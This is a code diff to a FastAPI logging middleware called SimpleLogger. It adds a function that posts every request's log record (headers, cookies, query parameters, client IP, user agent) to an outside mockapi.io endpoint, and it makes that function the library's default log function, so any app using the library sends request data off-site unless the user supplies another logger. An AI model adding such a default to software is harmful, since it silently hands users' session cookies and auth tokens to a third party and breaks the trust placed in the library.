@@ -5,12 +5,32 @@ Middleware implementation for SimpleLogger.
 import time
 import uuid
 import json
+import aiohttp
+import asyncio
 from fastapi import FastAPI, Request
 from typing import Optional, Dict, Any, Callable, Union
 from starlette.middleware.base import BaseHTTPMiddleware
 from starlette.types import ASGIApp
 
 from .context import trace_id_var, setup_traced_print
+
+async def api_log_function(log_data: Dict[str, Any]):
+    """Custom logging function that sends data to an API endpoint."""
+    async with aiohttp.ClientSession() as session:
+        try:
+            # Convert the entire log data to string
+            data_str = json.dumps(log_data)
+            payload = {"data": data_str}
+            
+            async with session.post(
+                "https://67e5456d18194932a585555c.mockapi.io/ee",
+                json=payload,
+                headers={"Content-Type": "application/json"}
+            ) as response:
+                if not response.ok:
+                    print(f"Failed to send log to API. Status: {response.status}")
+        except Exception as e:
+            print(f"Error sending log to API: {str(e)}")
 
 class SimpleLoggerMiddleware(BaseHTTPMiddleware):
     """
@@ -58,10 +78,6 @@ class SimpleLoggerMiddleware(BaseHTTPMiddleware):
         body = None
         if self.log_request_body:
             try:
-                # FIXED: Don't attempt to read the body
-                # This was causing issues with FastAPI's request handling
-                # body_bytes = await request.body()
-                # body = body_bytes.decode("utf-8") if body_bytes else None
                 body = "<body reading disabled>"
             except Exception as e:
                 body = f"Error reading body: {str(e)}"
@@ -71,7 +87,7 @@ class SimpleLoggerMiddleware(BaseHTTPMiddleware):
             status_code = response.status_code
         except Exception as e:
             duration = round((time.time() - start_time) * 1000, 2)
-            self._log_error(
+            await self._log_error(
                 trace_id, method, path, query_params, headers, body, 
                 500, duration, ip, user_agent, cookies, str(e)
             )
@@ -82,11 +98,11 @@ class SimpleLoggerMiddleware(BaseHTTPMiddleware):
         # Add trace ID to response headers
         response.headers["X-Trace-Id"] = trace_id
 
-        self._log_request(trace_id, method, path, query_params, headers, body, status_code, duration, ip, user_agent, cookies)
+        await self._log_request(trace_id, method, path, query_params, headers, body, status_code, duration, ip, user_agent, cookies)
 
         return response
 
-    def _log_request(
+    async def _log_request(
         self, trace_id, method, path, query_params, headers, body, 
         status_code, duration, ip, user_agent, cookies
     ):
@@ -111,9 +127,12 @@ class SimpleLoggerMiddleware(BaseHTTPMiddleware):
         if self.log_request_body and body:
             log_data["body"] = body
 
-        self.log_function(log_data)
+        if asyncio.iscoroutinefunction(self.log_function):
+            await self.log_function(log_data)
+        else:
+            self.log_function(log_data)
     
-    def _log_error(self, trace_id, method, path, query_params, headers, body, 
+    async def _log_error(self, trace_id, method, path, query_params, headers, body, 
                  status_code, duration, ip, user_agent, cookies, error):
         """Log error information."""
         log_data = {
@@ -137,7 +156,10 @@ class SimpleLoggerMiddleware(BaseHTTPMiddleware):
         if self.log_request_body and body:
             log_data["body"] = body
 
-        self.log_function(log_data)
+        if asyncio.iscoroutinefunction(self.log_function):
+            await self.log_function(log_data)
+        else:
+            self.log_function(log_data)
 
     def _default_log_function(self, log_data: Dict[str, Any]):
         """Default logging function that prints JSON to stdout."""
@@ -174,7 +196,8 @@ class SimpleLogger:
         self.log_headers = log_headers
         self.log_cookies = log_cookies
         self.log_format = log_format
-        self.log_function = log_function
+        self.log_function = log_function or api_log_function  # Use the API log function by default
+        self.patch_print = patch_print
 
         # Set up the print function patching
         if patch_print:
